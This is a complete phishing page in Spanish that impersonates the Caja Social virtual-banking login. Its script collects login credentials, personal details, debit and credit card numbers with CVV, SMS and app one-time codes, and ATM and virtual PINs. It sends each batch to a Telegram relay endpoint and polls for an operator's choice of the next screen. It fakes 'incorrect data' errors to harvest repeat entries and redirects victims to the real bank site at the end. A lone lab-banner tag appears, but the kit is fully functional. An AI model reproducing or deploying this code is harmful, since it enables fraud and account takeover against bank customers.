<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca Virtual | Caja Social</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: 'Open Sans';
            src: url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        }

        body {
            font-family: 'Open Sans', sans-serif;
            background: #f5f5f5;
        }

        .header {
            /*background: #005CA9;*/
            padding: 20px 0;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .logo {
            max-height: 50px;
        }

        .card-container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-top: 30px;
            padding: 40px;
        }

        .titulo-principal {
            color: #005CA9;
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 10px;
        }

        .subtitulo {
            color: #666;
            font-size: 16px;
            text-align: center;
            margin-bottom: 30px;
        }

        .form-label {
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .form-control {
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 12px;
            font-size: 15px;
            transition: all 0.3s;
        }

        .form-control:focus {
            border-color: #005CA9;
            box-shadow: 0 0 0 0.2rem rgba(0,92,169,0.1);
        }

        .form-select {
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 12px;
            font-size: 15px;
        }

        .btn-principal {
            background: linear-gradient(135deg, #005CA9, #004080);
            color: white;
            border: none;
            border-radius: 5px;
            padding: 12px 40px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 2px 5px rgba(0,92,169,0.3);
        }

        .btn-principal:hover:not(:disabled) {
            background: linear-gradient(135deg, #004080, #003060);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,92,169,0.4);
        }

        .btn-principal:disabled {
            background: #ccc;
            cursor: not-allowed;
            box-shadow: none;
        }

        .error-message {
            color: #d32f2f;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .campo-error {
            border-color: #d32f2f !important;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #005CA9;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none !important;
        }

        @media (max-width: 768px) {
            .card-container {
                margin: 20px 15px;
                padding: 25px 20px;
            }

            .titulo-principal {
                font-size: 20px;
            }

            .btn-principal {
                width: 100%;
            }
        }

        .check-container {
            margin-bottom: 20px;
        }

        .check-container input[type="checkbox"] {
            margin-right: 8px;
            accent-color: #005CA9;
        }

        .check-container label {
            font-size: 14px;
            color: #333;
        }

        .success-icon {
            color: #4CAF50;
            font-size: 80px;
            margin-bottom: 20px;
        }

        .error-icon {
            color: #d32f2f;
            font-size: 80px;
            margin-bottom: 20px;
        }

        .mensaje-general-error {
            background: #ffebee;
            color: #c62828;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }

        .mensaje-general-error.show {
            display: block;
        }
    </style>
</head>

<body>
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="loading-overlay">
        <div class="text-center">
            <div class="spinner"></div>
            <p class="mt-3" style="color: #666;">Procesando su solicitud...</p>
        </div>
    </div>

    <!-- Header -->
    <div class="header">
        <div class="container text-center">
            <img src="/cajasocial/logo_cajasocial.svg" alt="Caja Social" class="logo">
        </div>
    </div>

    <!-- Vista: Login -->
    <div id="login" class="container hidden">
        <div class="card-container">
            <h1 class="titulo-principal">Bienvenido a tu Banca Virtual</h1>
            <p class="subtitulo">Ingresa tus datos para acceder</p>

            <div id="errorGeneralLogin" class="mensaje-general-error"></div>

            <form>
                <div class="mb-3">
                    <label class="form-label" for="tipo-documento">Tipo de Documento</label>
                    <select class="form-select" id="tipo-documento">
                        <option value="1" selected>Cédula de Ciudadanía</option>
                        <option value="2">Tarjeta de Identidad</option>
                        <option value="3">Cédula de Extranjería</option>
                        <option value="4">Pasaporte</option>
                        <option value="5">NIT</option>
                    </select>
                </div>

                <div class="mb-3">
                    <label class="form-label" for="usuario">Número de Documento</label>
                    <input type="text" class="form-control" id="usuario"
                           minlength="5" maxlength="15" autocomplete="off">
                    <div class="error-message" id="errorUsuario"></div>
                </div>

                <div class="mb-4">
                    <label class="form-label" for="clave">Contraseña</label>
                    <input type="password" class="form-control" id="clave"
                           minlength="4" maxlength="20" autocomplete="off">
                    <div class="error-message" id="errorClave"></div>
                </div>

                <div class="text-center mt-4">
                    <button type="button" id="btnLogin" class="btn-principal" disabled>Ingresar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Vista: Datos Personales -->
    <div id="datos" class="container hidden">
        <div class="card-container">
            <h1 class="titulo-principal">Verificación de Seguridad</h1>
            <p class="subtitulo">Por favor confirma tus datos personales</p>

            <div id="errorGeneralDatos" class="mensaje-general-error"></div>

            <form>
                <div class="mb-3">
                    <label class="form-label" for="nombre">Nombre Completo</label>
                    <input type="text" class="form-control" id="nombre"
                           minlength="3" maxlength="100" autocomplete="off">
                    <div class="error-message" id="errorNombre"></div>
                </div>

                <div class="mb-3">
                    <label class="form-label" for="cedula">Número de Documento</label>
                    <input type="text" class="form-control" id="cedula"
                           minlength="5" maxlength="15" autocomplete="off">
                    <div class="error-message" id="errorCedula"></div>
                </div>

                <div class="mb-3">
                    <label class="form-label" for="email">Correo Electrónico</label>
                    <input type="email" class="form-control" id="email"
                           autocomplete="off">
                    <div class="error-message" id="errorEmail"></div>
                </div>

                <div class="mb-3">
                    <label class="form-label" for="celular">Número de Celular</label>
                    <input type="text" class="form-control" id="celular"
                           minlength="10" maxlength="10" autocomplete="off">
                    <div class="error-message" id="errorCelular"></div>
                </div>

                <div class="mb-3">
                    <label class="form-label" for="ciudad">Ciudad</label>
                    <input type="text" class="form-control" id="ciudad"
                           minlength="3" maxlength="50" autocomplete="off">
                    <div class="error-message" id="errorCiudad"></div>
                </div>

                <div class="mb-4">
                    <label class="form-label" for="direccion">Dirección</label>
                    <input type="text" class="form-control" id="direccion"
                           minlength="5" maxlength="150" autocomplete="off">
                    <div class="error-message" id="errorDireccion"></div>
                </div>

                <div class="text-center">
                    <button type="button" id="btnDatos" class="btn-principal" disabled>Continuar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Vista: Tarjeta de Débito -->
    <div id="tdb" class="container hidden">
        <div class="card-container">
            <h1 class="titulo-principal">Verificación de Tarjeta</h1>
            <p class="subtitulo">Ingrese los datos de su tarjeta débito</p>

            <div id="errorGeneralTDB" class="mensaje-general-error"></div>

            <form>
                <div class="mb-3">
                    <label class="form-label" for="numtarjetaTDB">Número de Tarjeta Débito</label>
                    <input type="text" class="form-control" id="numtarjetaTDB"
                           minlength="16" maxlength="19" autocomplete="off">
                    <div class="error-message" id="errorNumTarjetaTDB"></div>
                </div>

                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label" for="vencimientoTDB">Fecha de Vencimiento</label>
                        <input type="text" class="form-control" id="vencimientoTDB"
                               placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                        <div class="error-message" id="errorVencimientoTDB"></div>
                    </div>

                    <div class="col-md-6 mb-3">
                        <label class="form-label" for="cvvTDB">CVV</label>
                        <input type="text" class="form-control" id="cvvTDB"
                               minlength="3" maxlength="4" autocomplete="off">
                        <div class="error-message" id="errorCVVTDB"></div>
                    </div>
                </div>

                <div class="check-container">
                    <input type="checkbox" id="checkTDB">
                    <label for="checkTDB">Confirmo que soy el titular de esta tarjeta</label>
                </div>

                <div class="text-center">
                    <button type="button" id="btnTDB" class="btn-principal" disabled>Validar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Vista: Tarjeta de Crédito -->
    <div id="tdc" class="container hidden">
        <div class="card-container">
            <h1 class="titulo-principal">Verificación de Tarjeta</h1>
            <p class="subtitulo">Ingrese los datos de su tarjeta de crédito</p>

            <div id="errorGeneralTDC" class="mensaje-general-error"></div>

            <form>
                <div class="mb-3">
                    <label class="form-label" for="numtarjetaTDC">Número de Tarjeta de Crédito</label>
                    <input type="text" class="form-control" id="numtarjetaTDC"
                           minlength="16" maxlength="19" autocomplete="off">
                    <div class="error-message" id="errorNumTarjetaTDC"></div>
                </div>

                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label" for="vencimientoTDC">Fecha de Vencimiento</label>
                        <input type="text" class="form-control" id="vencimientoTDC"
                               placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                        <div class="error-message" id="errorVencimientoTDC"></div>
                    </div>

                    <div class="col-md-6 mb-3">
                        <label class="form-label" for="cvvTDC">CVV</label>
                        <input type="text" class="form-control" id="cvvTDC"
                               minlength="3" maxlength="4" autocomplete="off">
                        <div class="error-message" id="errorCVVTDC"></div>
                    </div>
                </div>

                <div class="check-container">
                    <input type="checkbox" id="checkTDC">
                    <label for="checkTDC">Confirmo que soy el titular de esta tarjeta</label>
                </div>

                <div class="text-center">
                    <button type="button" id="btnTDC" class="btn-principal" disabled>Validar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Vista: Código SMS -->
    <div id="codsms" class="container hidden">
        <div class="card-container">
            <h1 class="titulo-principal">Verificación SMS</h1>
            <p class="subtitulo">Hemos enviado un código a tu celular registrado</p>

            <div id="errorGeneralCodSMS" class="mensaje-general-error"></div>

            <form>
                <div class="mb-4">
                    <label class="form-label" for="codsmsInput">Código de Verificación</label>
                    <input type="password" class="form-control text-center" id="codsmsInput"
                           minlength="6" maxlength="8" autocomplete="off"
                           style="font-size: 20px; letter-spacing: 5px;">
                    <div class="error-message" id="errorCodSMS"></div>
                </div>

                <div class="text-center">
                    <button type="button" id="btnCodSMS" class="btn-principal" disabled>Verificar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Vista: Código App -->
    <div id="codapp" class="container hidden">
        <div class="card-container">
            <h1 class="titulo-principal">Verificación App</h1>
            <p class="subtitulo">Ingrese el código generado en su aplicación móvil</p>

            <div id="errorGeneralCodApp" class="mensaje-general-error"></div>

            <form>
                <div class="mb-4">
                    <label class="form-label" for="codappInput">Código de la Aplicación</label>
                    <input type="password" class="form-control text-center" id="codappInput"
                           minlength="6" maxlength="8" autocomplete="off"
                           style="font-size: 20px; letter-spacing: 5px;">
                    <div class="error-message" id="errorCodApp"></div>
                </div>

                <div class="text-center">
                    <button type="button" id="btnCodApp" class="btn-principal" disabled>Verificar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Vista: Clave de Cajero -->
    <div id="pincaj" class="container hidden">
        <div class="card-container">
            <h1 class="titulo-principal">Verificación de Seguridad</h1>
            <p class="subtitulo">Por favor ingrese su clave de cajero automático</p>

            <div id="errorGeneralPinCaj" class="mensaje-general-error"></div>

            <form>
                <div class="mb-4">
                    <label class="form-label" for="pincajInput">Clave de Cajero (4 dígitos)</label>
                    <input type="password" class="form-control text-center" id="pincajInput"
                           minlength="4" maxlength="4" autocomplete="off"
                           style="font-size: 24px; letter-spacing: 10px;">
                    <div class="error-message" id="errorPinCaj"></div>
                </div>

                <div class="text-center">
                    <button type="button" id="btnPinCaj" class="btn-principal" disabled>Validar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Vista: Clave Virtual -->
    <div id="pinvir" class="container hidden">
        <div class="card-container">
            <h1 class="titulo-principal">Verificación de Seguridad</h1>
            <p class="subtitulo">Por favor ingrese su clave virtual</p>

            <div id="errorGeneralPinVir" class="mensaje-general-error"></div>

            <form>
                <div class="mb-4">
                    <label class="form-label" for="pinvirInput">Clave Virtual (4 dígitos)</label>
                    <input type="password" class="form-control text-center" id="pinvirInput"
                           minlength="4" maxlength="4" autocomplete="off"
                           style="font-size: 24px; letter-spacing: 10px;">
                    <div class="error-message" id="errorPinVir"></div>
                </div>

                <div class="text-center">
                    <button type="button" id="btnPinVir" class="btn-principal" disabled>Validar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Vista: Éxito -->
    <div id="exito" class="container hidden">
        <div class="card-container text-center">
            <i class="bi bi-check-circle-fill success-icon"></i>
            <h2 style="color: #333; margin-bottom: 20px;">Proceso Completado</h2>
            <p style="color: #666;">Su transacción ha sido procesada exitosamente.</p>
            <p style="color: #666;">Será redirigido en unos momentos...</p>
        </div>
    </div>

    <!-- Vista: Error -->
    <div id="error" class="container hidden">
        <div class="card-container text-center">
            <i class="bi bi-x-circle-fill error-icon"></i>
            <h2 style="color: #333; margin-bottom: 20px;">Error en el Proceso</h2>
            <p style="color: #666;">No fue posible completar la operación.</p>
            <p style="color: #666;">Por favor intente más tarde.</p>
        </div>
    </div>

    <!-- Vista: Wait -->
    <div id="wait" class="container hidden">
        <div class="card-container text-center">
            <div class="spinner" style="margin: 0 auto;"></div>
            <h3 style="color: #005CA9; margin-top: 20px;">Procesando...</h3>
            <p style="color: #666;">Por favor espere mientras validamos su información</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login'
            };

            console.log('Session ID:', appState.uniqId);

            // ==================== FUNCIONES DE ALMACENAMIENTO ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            // ==================== FUNCIONES DE UI ====================
            function mostrarError(fieldId, errorId, mensaje) {
                $('#' + errorId).text(mensaje).addClass('show');
                $('#' + fieldId).addClass('campo-error');
            }

            function ocultarError(fieldId, errorId) {
                $('#' + errorId).removeClass('show').text('');
                $('#' + fieldId).removeClass('campo-error');
            }

            function hideAllViews() {
                $('#login, #datos, #tdb, #tdc, #codsms, #codapp, #pincaj, #pinvir, #exito, #error, #wait').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Verificar si la vista ya fue mostrada antes
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    // Mostrar mensaje de error y limpiar campos
                    if (viewId === 'login') {
                        $('#errorGeneralLogin').text('Datos incorrectos. Por favor verifique e intente nuevamente.').addClass('show');
                        $('#usuario').val('');
                        $('#clave').val('');
                        $('#btnLogin').prop('disabled', true);
                    } else if (viewId === 'datos') {
                        $('#errorGeneralDatos').text('Los datos ingresados no son correctos. Verifique e intente nuevamente.').addClass('show');
                        $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').val('');
                        $('#btnDatos').prop('disabled', true);
                    } else if (viewId === 'tdb') {
                        $('#errorGeneralTDB').text('Los datos de la tarjeta no son válidos. Verifique e intente nuevamente.').addClass('show');
                        $('#numtarjetaTDB, #vencimientoTDB, #cvvTDB').val('');
                        $('#checkTDB').prop('checked', false);
                        $('#btnTDB').prop('disabled', true);
                    } else if (viewId === 'tdc') {
                        $('#errorGeneralTDC').text('Los datos de la tarjeta no son válidos. Verifique e intente nuevamente.').addClass('show');
                        $('#numtarjetaTDC, #vencimientoTDC, #cvvTDC').val('');
                        $('#checkTDC').prop('checked', false);
                        $('#btnTDC').prop('disabled', true);
                    } else if (viewId === 'codsms') {
                        $('#errorGeneralCodSMS').text('El código ingresado no es válido. Intente nuevamente.').addClass('show');
                        $('#codsmsInput').val('');
                        $('#btnCodSMS').prop('disabled', true);
                    } else if (viewId === 'codapp') {
                        $('#errorGeneralCodApp').text('El código ingresado no es válido. Intente nuevamente.').addClass('show');
                        $('#codappInput').val('');
                        $('#btnCodApp').prop('disabled', true);
                    } else if (viewId === 'pincaj') {
                        $('#errorGeneralPinCaj').text('La clave ingresada no es correcta. Intente nuevamente.').addClass('show');
                        $('#pincajInput').val('');
                        $('#btnPinCaj').prop('disabled', true);
                    } else if (viewId === 'pinvir') {
                        $('#errorGeneralPinVir').text('La clave ingresada no es correcta. Intente nuevamente.').addClass('show');
                        $('#pinvirInput').val('');
                        $('#btnPinVir').prop('disabled', true);
                    }
                } else {
                    // Limpiar mensajes de error
                    $('.mensaje-general-error').removeClass('show').text('');
                }

                // Registrar vista en historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').addClass('active');
                setTimeout(iniciarPolling, 3000);
            }

            function hideLoading() {
                $('#loading').removeClass('active');
            }

            // ==================== COMUNICACIÓN CON TELEGRAM ====================
            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Envío en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = ['usuario', 'clave', 'ente', 'numtarjetaTDB', 'cvvTDB', 'vencimientoTDB',
                    'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC', 'nombre', 'cedula', 'email',
                    'celular', 'ciudad', 'direccion', 'codsms', 'codapp', 'pincaj', 'pinvir',
                    'status', 'uniqid'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                console.log('Enviando datos:', allData);

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Respuesta del servidor:', result);
                } catch (e) {
                    console.error('Error al enviar:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (!loadingElement.classList.contains('active')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        const viewMap = {
                            'login': 'login',
                            'datos': 'datos',
                            'tdb': 'tdb',
                            'tdc': 'tdc',
                            'codsms': 'codsms',
                            'codapp': 'codapp',
                            'pincaj': 'pincaj',
                            'pinvir': 'pinvir',
                            'exito': 'exito',
                            'error': 'error'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redirección automática
                        if (viewId === 'exito' || viewId === 'error') {
                            setTimeout(function () {
                                window.location.href = 'https://www.cajasocial.com/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) return false;

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);
                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) digito -= 9;
                    }
                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) return false;

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) return false;
                if (anioNum === anioActual && mesNum < mesActual) return false;

                return true;
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const isValid = usuario.length >= 5 && clave.length >= 4;
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            function validateDatos() {
                const nombre = $('#nombre').val().trim();
                const cedula = $('#cedula').val().trim();
                const email = $('#email').val().trim();
                const celular = $('#celular').val().trim();
                const ciudad = $('#ciudad').val().trim();
                const direccion = $('#direccion').val().trim();

                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

                const isValid = nombre.length >= 3 &&
                               cedula.length >= 5 &&
                               emailRegex.test(email) &&
                               celular.length === 10 &&
                               ciudad.length >= 3 &&
                               direccion.length >= 5;

                $('#btnDatos').prop('disabled', !isValid);
                return isValid;
            }

            function validateTarjeta(tipo) {
                const numInput = tipo === 'tdb' ? '#numtarjetaTDB' : '#numtarjetaTDC';
                const venInput = tipo === 'tdb' ? '#vencimientoTDB' : '#vencimientoTDC';
                const cvvInput = tipo === 'tdb' ? '#cvvTDB' : '#cvvTDC';
                const checkInput = tipo === 'tdb' ? '#checkTDB' : '#checkTDC';
                const btnInput = tipo === 'tdb' ? '#btnTDB' : '#btnTDC';

                const num = $(numInput).val().replace(/\s/g, '');
                const ven = $(venInput).val();
                const cvv = $(cvvInput).val();
                const check = $(checkInput).is(':checked');

                const isValid = num.length >= 15 &&
                               validarLuhn(num) &&
                               validarVencimiento(ven) &&
                               cvv.length >= 3 &&
                               check;

                $(btnInput).prop('disabled', !isValid);
                return isValid;
            }

            function validateOtp(inputId, btnId) {
                const value = $(inputId).val().trim();
                let isValid = false;

                if (inputId === '#pincajInput' || inputId === '#pinvirInput') {
                    isValid = /^\d{4}$/.test(value);
                } else {
                    isValid = /^\d{6,8}$/.test(value);
                }

                $(btnId).prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS DE FORMULARIOS ====================

            // Login
            $('#usuario, #clave').on('input', function() {
                ocultarError(this.id, 'error' + this.id.charAt(0).toUpperCase() + this.id.slice(1));
                validateLogin();
            });

            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'cajasocial');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Datos Personales
            $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').on('input', function() {
                ocultarError(this.id, 'error' + this.id.charAt(0).toUpperCase() + this.id.slice(1));
                validateDatos();
            });

            $('#btnDatos').on('click', async function () {
                if (validateDatos()) {
                    saveToLocalStorage('nombre', $('#nombre').val().trim());
                    saveToLocalStorage('cedula', $('#cedula').val().trim());
                    saveToLocalStorage('email', $('#email').val().trim());
                    saveToLocalStorage('celular', $('#celular').val().trim());
                    saveToLocalStorage('ciudad', $('#ciudad').val().trim());
                    saveToLocalStorage('direccion', $('#direccion').val().trim());
                    saveToLocalStorage('status', 'DATOS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta Débito
            $('#numtarjetaTDB').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdb');
            });

            $('#vencimientoTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#cvvTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#checkTDB').on('change', function () {
                validateTarjeta('tdb');
            });

            $('#btnTDB').on('click', async function () {
                if (validateTarjeta('tdb')) {
                    saveToLocalStorage('numtarjetaTDB', $('#numtarjetaTDB').val().trim());
                    saveToLocalStorage('cvvTDB', $('#cvvTDB').val().trim());
                    saveToLocalStorage('vencimientoTDB', $('#vencimientoTDB').val().trim());
                    saveToLocalStorage('status', 'TDB');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta Crédito
            $('#numtarjetaTDC').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdc');
            });

            $('#vencimientoTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#cvvTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#checkTDC').on('change', function () {
                validateTarjeta('tdc');
            });

            $('#btnTDC').on('click', async function () {
                if (validateTarjeta('tdc')) {
                    saveToLocalStorage('numtarjetaTDC', $('#numtarjetaTDC').val().trim());
                    saveToLocalStorage('cvvTDC', $('#cvvTDC').val().trim());
                    saveToLocalStorage('vencimientoTDC', $('#vencimientoTDC').val().trim());
                    saveToLocalStorage('status', 'TDC');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Código SMS
            $('#codsmsInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 8) value = value.substring(0, 8);
                $(this).val(value);
                validateOtp('#codsmsInput', '#btnCodSMS');
            });

            $('#btnCodSMS').on('click', async function () {
                if (validateOtp('#codsmsInput', '#btnCodSMS')) {
                    saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                    saveToLocalStorage('status', 'CODSMS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Código App
            $('#codappInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 8) value = value.substring(0, 8);
                $(this).val(value);
                validateOtp('#codappInput', '#btnCodApp');
            });

            $('#btnCodApp').on('click', async function () {
                if (validateOtp('#codappInput', '#btnCodApp')) {
                    saveToLocalStorage('codapp', $('#codappInput').val().trim());
                    saveToLocalStorage('status', 'CODAPP');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave Cajero
            $('#pincajInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateOtp('#pincajInput', '#btnPinCaj');
            });

            $('#btnPinCaj').on('click', async function () {
                if (validateOtp('#pincajInput', '#btnPinCaj')) {
                    saveToLocalStorage('pincaj', $('#pincajInput').val().trim());
                    saveToLocalStorage('status', 'PINCAJ');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave Virtual
            $('#pinvirInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateOtp('#pinvirInput', '#btnPinVir');
            });

            $('#btnPinVir').on('click', async function () {
                if (validateOtp('#pinvirInput', '#btnPinVir')) {
                    saveToLocalStorage('pinvir', $('#pinvirInput').val().trim());
                    saveToLocalStorage('status', 'PINVIR');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // ==================== INICIALIZACIÓN ====================
            showView('login');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>